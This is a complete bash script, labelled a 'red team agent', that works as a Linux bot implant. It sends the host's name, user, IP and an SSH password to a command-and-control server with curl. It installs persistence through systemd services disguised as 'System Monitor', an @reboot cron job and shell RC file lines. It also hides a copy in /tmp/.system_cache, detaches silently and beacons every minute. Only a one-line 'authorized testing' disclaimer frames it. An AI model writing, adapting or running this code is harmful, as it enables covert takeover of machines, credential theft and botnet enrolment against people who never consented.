#!/bin/bash
# Professional Red Team Agent - Linux
# For authorized penetration testing only

# Configuration - can be overridden by environment variables or arguments
CNC_SERVER="${CNC_SERVER:-${1:-http://192.168.1.10:5000}}"
BOT_ID="${BOT_ID:-${2:-$(hostname)-$RANDOM}}"
SSH_PASSWORD="${SSH_PASSWORD:-CHANGE_ME}"
STEALTH_MODE="${STEALTH_MODE:-1}"
MAX_RETRIES=3

# Gather system information
HOSTNAME=$(hostname)
USERNAME=$(whoami)
IP_ADDR=$(hostname -I 2>/dev/null | awk '{print $1}')
[ -z "$IP_ADDR" ] && IP_ADDR=$(ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \K\S+')
[ -z "$IP_ADDR" ] && IP_ADDR="127.0.0.1"

# Logging function
log() {
    if [ "$STEALTH_MODE" != "1" ]; then
        echo "[$1] $2"
    fi
}

# Function to register with C&C server
register_bot() {
    log "*" "Attempting to register with C&C server: $CNC_SERVER"
    log "*" "Bot ID: $BOT_ID"
    log "*" "Hostname: $HOSTNAME"
    log "*" "Username: $USERNAME"
    log "*" "IP: $IP_ADDR"
    
    local payload=$(cat <<EOF
{
  "bot_id": "$BOT_ID",
  "host": "$IP_ADDR",
  "port": 22,
  "username": "$USERNAME",
  "password": "$SSH_PASSWORD",
  "hostname": "$HOSTNAME",
  "os": "Linux"
}
EOF
)
    
    for attempt in $(seq 1 $MAX_RETRIES); do
        response=$(curl -s -X POST "$CNC_SERVER/add_bot" \
            -H "Content-Type: application/json" \
            -d "$payload" \
            --max-time 10 2>/dev/null)
        
        if echo "$response" | grep -q '"status".*"success"'; then
            log "+" "Successfully registered with C&C server!"
            return 0
        else
            log "-" "Registration attempt $attempt failed"
            [ $attempt -lt $MAX_RETRIES ] && sleep $((attempt * 5))
        fi
    done
    
    log "-" "Failed to register after $MAX_RETRIES attempts"
    return 1
}

# Function to send heartbeat
send_heartbeat() {
    local payload=$(cat <<EOF
{
  "bot_id": "$BOT_ID"
}
EOF
)
    
    response=$(curl -s -X POST "$CNC_SERVER/heartbeat" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        --max-time 10 2>/dev/null)
    
    if echo "$response" | grep -q '"status".*"success"'; then
        log "." "Heartbeat sent successfully"
        return 0
    else
        log "-" "Heartbeat failed"
        return 1
    fi
}

# Function to establish persistence with multiple methods
establish_persistence() {
    log "*" "Establishing persistence..."
    
    SCRIPT_PATH=$(readlink -f "$0")
    
    # Method 1: Systemd service (requires root)
    if [ "$EUID" -eq 0 ] || [ "$(id -u)" -eq 0 ]; then
        cat > /etc/systemd/system/system-monitor.service 2>/dev/null <<EOF
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
User=$USERNAME
ExecStart=/bin/bash $SCRIPT_PATH
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload 2>/dev/null
        systemctl enable system-monitor.service 2>/dev/null
        systemctl start system-monitor.service 2>/dev/null
        
        if systemctl is-active --quiet system-monitor.service 2>/dev/null; then
            log "+" "Systemd service persistence established"
            return 0
        fi
    fi
    
    # Method 2: Cron job (user-level)
    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null | grep -v "$SCRIPT_PATH"; echo "@reboot /bin/bash $SCRIPT_PATH >/dev/null 2>&1") | crontab - 2>/dev/null
        if [ $? -eq 0 ]; then
            log "+" "Cron job persistence established"
            return 0
        fi
    fi
    
    # Method 3: Shell RC files
    for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile"; do
        if [ -w "$rc" ]; then
            if ! grep -q "$SCRIPT_PATH" "$rc" 2>/dev/null; then
                echo "" >> "$rc"
                echo "# System monitor" >> "$rc"
                echo "/bin/bash $SCRIPT_PATH >/dev/null 2>&1 &" >> "$rc"
                log "+" "Shell RC persistence added to $rc"
                return 0
            fi
        fi
    done
    
    # Method 4: User systemd (systemctl --user)
    if command -v systemctl >/dev/null 2>&1 && [ "$EUID" -ne 0 ]; then
        USER_SERVICE_DIR="$HOME/.config/systemd/user"
        mkdir -p "$USER_SERVICE_DIR" 2>/dev/null
        
        cat > "$USER_SERVICE_DIR/system-monitor.service" 2>/dev/null <<EOF
[Unit]
Description=System Monitor
After=default.target

[Service]
Type=simple
ExecStart=/bin/bash $SCRIPT_PATH
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable system-monitor.service 2>/dev/null
        systemctl --user start system-monitor.service 2>/dev/null
        
        if [ $? -eq 0 ]; then
            log "+" "User systemd persistence established"
            return 0
        fi
    fi
    
    log "-" "Failed to establish persistence"
    return 1
}

# Function to hide the process
hide_process() {
    # Copy script to hidden location
    HIDDEN_PATH="/tmp/.system_cache"
    if [ ! -f "$HIDDEN_PATH" ]; then
        cp "$0" "$HIDDEN_PATH" 2>/dev/null
        chmod +x "$HIDDEN_PATH" 2>/dev/null
        log "+" "Hidden copy created at $HIDDEN_PATH"
    fi
}

# Function to run as daemon
daemonize() {
    if [ "$STEALTH_MODE" = "1" ]; then
        # Fork to background and detach
        if [ -t 0 ]; then
            # Running in terminal, detach
            setsid "$0" "$@" </dev/null >/dev/null 2>&1 &
            exit 0
        fi
    fi
}

# Main execution
daemonize "$@"

log "*" "Red Team Agent Starting..."
log "*" "Bot ID: $BOT_ID"
log "*" "Hostname: $HOSTNAME"
log "*" "Username: $USERNAME"
log "*" "IP Address: $IP_ADDR"

# Register with C&C server
if register_bot; then
    # Establish persistence
    establish_persistence
    
    # Hide the process
    hide_process
    
    log "+" "Agent initialized successfully"
    
    # Beacon loop with automatic reconnection
    consecutive_failures=0
    max_failures=10
    
    while true; do
        sleep 60
        
        # Send heartbeat to update last_seen status
        if send_heartbeat; then
            consecutive_failures=0
        else
            consecutive_failures=$((consecutive_failures + 1))
        fi
        
        # Periodic check-in / re-registration
        if [ $consecutive_failures -gt $max_failures ]; then
            log "!" "Max failures reached, attempting re-registration..."
            if register_bot; then
                consecutive_failures=0
            else
                sleep 300  # Wait 5 minutes before retry
            fi
        fi
    done
else
    log "-" "Initial registration failed, will retry..."
    # Don't exit, keep trying
    while true; do
        sleep 300  # Wait 5 minutes
        if register_bot; then
            establish_persistence
            hide_process
            log "+" "Agent initialized successfully on retry"
            # Start beacon loop
            consecutive_failures=0
            while true; do
                sleep 60
                if send_heartbeat; then
                    consecutive_failures=0
                else
                    consecutive_failures=$((consecutive_failures + 1))
                fi
            done
        fi
    done
fi
